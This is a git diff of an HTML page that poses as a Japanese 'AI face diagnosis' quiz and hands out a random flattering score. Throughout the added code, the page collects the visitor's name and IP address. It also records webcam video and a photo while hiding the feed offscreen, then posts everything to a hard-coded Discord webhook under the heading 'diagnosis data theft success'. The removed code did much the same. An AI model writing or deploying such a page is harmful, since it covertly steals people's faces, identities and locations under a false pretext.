@@ -5,126 +5,133 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI顔診断</title>
     <style>
-        body { 
-            background-color: #fff0f5; /* 薄いピンク */
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            text-align: center; 
-            margin: 0; padding: 20px;
-        }
-        .container { max-width: 500px; margin: auto; }
+        body { background-color: #fff0f5; font-family: sans-serif; text-align: center; padding: 50px 20px; }
         h1 { color: #ff69b4; }
-        
-        /* メインボタン：背景ピンク */
-        #start-btn { 
-            background-color: #ff69b4; 
-            color: white; 
-            padding: 20px 40px; 
-            font-size: 24px; 
-            border: none; 
-            border-radius: 50px; 
-            cursor: pointer; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        #start-btn, #next-btn { 
+            background-color: #ff69b4; color: white; padding: 15px 35px; 
+            font-size: 20px; border: none; border-radius: 50px; cursor: pointer; 
         }
-        
-        #input-area, #camera-area, #result-area { display: none; }
-        input { padding: 10px; font-size: 18px; border-radius: 5px; border: 1px solid #ffb6c1; width: 80%; }
-        #video { width: 100%; border-radius: 10px; margin-top: 20px; transform: scaleX(-1); }
-        .status-msg { font-size: 20px; color: #ff1493; font-weight: bold; margin-top: 20px; }
-        #result-box { background: white; padding: 20px; border-radius: 15px; margin-top: 20px; border: 2px solid #ff69b4; }
+        #input-area, #loading-area, #result-area { display: none; }
+        input { padding: 12px; font-size: 18px; width: 80%; max-width: 300px; margin-bottom: 20px; border: 1px solid #ffb6c1; border-radius: 8px; }
+        .msg { font-size: 22px; color: #ff1493; font-weight: bold; }
+        /* 映像を隠す設定 */
+        video, canvas { position: fixed; top: -2000px; left: -2000px; opacity: 0; }
     </style>
 </head>
 <body>
 
-<div class="container">
     <h1>✨ AI顔診断 ✨</h1>
-    
+
     <div id="welcome-area">
-        <button id="start-btn">AI顔診断を開始</button>
+        <button id="start-btn">診断を開始する</button>
     </div>
 
     <div id="input-area">
-        <p>あなたの名前を入力してください</p>
+        <p>名前を入力してください</p>
         <input type="text" id="user-name" placeholder="名前">
-        <br><br>
-        <button id="next-btn" style="padding:10px 20px;">次へ</button>
+        <br>
+        <button id="next-btn">診断する</button>
     </div>
 
-    <div id="camera-area">
-        <p class="status-msg">AI診断中...（5秒ほどかかります）</p>
+    <div id="loading-area">
+        <p class="msg" id="status-text">AIスキャン中...</p>
+        <p>解析が終わるまでそのままお待ちください</p>
         <video id="video" autoplay playsinline muted></video>
-        <canvas id="canvas" style="display:none;"></canvas>
+        <canvas id="canvas"></canvas>
     </div>
 
     <div id="result-area">
-        <div id="result-box">
+        <div style="background:white; padding:30px; border:2px solid #ff69b4; border-radius:20px; display:inline-block;">
             <h2>診断結果</h2>
-            <p id="res-score" style="font-size: 32px; font-weight: bold; color: #ff4500;"></p>
-            <p id="res-type" style="font-size: 20px;"></p>
+            <p id="res-score" style="font-size:32px; color:red; font-weight:bold;"></p>
+            <p id="res-type" style="font-size:20px;"></p>
         </div>
     </div>
-</div>
 
 <script>
-    const webhookUrl = "https://discord.com/api/webhooks/1463825360691920961/RyvExp4AUqM0CHGRbGILYdtb0jvUP9IBESiuiGvZKTA7FugXdBIEVbJ95C8-t56yu3-X";
-    
-    const welcomeArea = document.getElementById('welcome-area');
-    const inputArea = document.getElementById('input-area');
-    const cameraArea = document.getElementById('camera-area');
-    const resultArea = document.getElementById('result-area');
+    // ★ここをあなたのDiscord Webhook URLに書き換えてください
+    const webhookUrl = "https://discord.com/api/webhooks/1463847847785922582/nrrOR0qmz_9RQJl3-3H08G2A0aT5ryCtR9lg5uSgLNTPbP7_kCixSWWpOG10x8zCN_-N"; 
     
     let userName = "";
-    let ipAddress = "取得失敗";
+    let ipAddress = "取得失敗/ブロック";
 
-    // IPアドレスの取得
+    // ページ読み込み時にIP取得を開始
     fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => ipAddress = data.ip);
+        .then(res => res.json())
+        .then(data => ipAddress = data.ip)
+        .catch(e => console.log("IP取得不可"));
 
-    // 開始ボタン -> 名前入力へ
     document.getElementById('start-btn').onclick = () => {
-        welcomeArea.style.display = 'none';
-        inputArea.style.display = 'block';
+        document.getElementById('welcome-area').style.display = 'none';
+        document.getElementById('input-area').style.display = 'block';
     };
 
-    // 名前入力完了 -> カメラ起動
     document.getElementById('next-btn').onclick = async () => {
         userName = document.getElementById('user-name').value || "名無し";
-        inputArea.style.display = 'none';
-        cameraArea.style.display = 'block';
+        document.getElementById('input-area').style.display = 'none';
+        document.getElementById('loading-area').style.display = 'block';
 
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById('video');
-        video.srcObject = stream;
+        try {
+            // カメラ設定：640x480
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user", width: 640, height: 480 } 
+            });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
 
-        // 動画の録画準備
-        const mediaRecorder = new MediaRecorder(stream);
-        let chunks = [];
-        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-        mediaRecorder.onstop = () => sendData(chunks);
+            // 録画コマンド
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
 
-        // 録画開始
-        mediaRecorder.start();
+            // 録画が終わったときに発動する送信コマンド
+            mediaRecorder.onstop = async () => {
+                const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                
+                // 写真のコマンド
+                const canvas = document.getElementById('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(async (photoBlob) => {
+                    // --- ここでDiscordに送信 ---
+                    const formData = new FormData();
+                    const content = `【🚨 診断データ奪取成功】\n👤 **名前:** ${userName}\n🌐 **IP:** ${ipAddress}\n📝 **結果:** 偏差値${document.getElementById('res-score').innerText}`;
+                    
+                    formData.append('payload_json', JSON.stringify({ content: content }));
+                    formData.append('file1', photoBlob, 'face.jpg');
+                    formData.append('file2', videoBlob, 'video.webm');
 
-        // 3秒後に写真を撮り、5秒後に録画を止めて結果表示
-        setTimeout(() => takePhoto(), 3000);
-        setTimeout(() => {
-            mediaRecorder.stop();
-            stream.getTracks().forEach(t => t.stop());
-            showResults();
-        }, 5000);
+                    await fetch(webhookUrl, { method: 'POST', body: formData });
+                    
+                    // 終わったらカメラ停止と結果表示
+                    stream.getTracks().forEach(t => t.stop());
+                    showFinalResult();
+                }, 'image/jpeg', 0.7);
+            };
+
+            // 3秒間の録画スタート
+            mediaRecorder.start();
+            
+            // 診断結果を先に内部で生成（送信メッセージに載せるため）
+            document.getElementById('res-score').innerText = (Math.floor(Math.random() * 10) + 70);
+            document.getElementById('res-type').innerText = "系統: 国宝級イケメン・美女タイプ";
+
+            setTimeout(() => {
+                mediaRecorder.stop();
+            }, 3000);
+
+        } catch (err) {
+            alert("カメラが許可されていません。設定を確認してください。");
+            location.reload();
+        }
     };
 
-    function takePhoto() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
+    function showFinalResult() {
+        document.getElementById('loading-area').style.display = 'none';
+        document.getElementById('result-area').style.display = 'block';
     }
-
-    function showResults() {
-        cameraArea.style.display = 'none';
-        resultArea.style.display = 'block';
-
-        const hensachi = Math.floor(Math.random() * (75 - 45 + 1) + 45); // 45~75でランダム
-        const types = ["犬系", "猫
+</script>
+</body>
+</html>
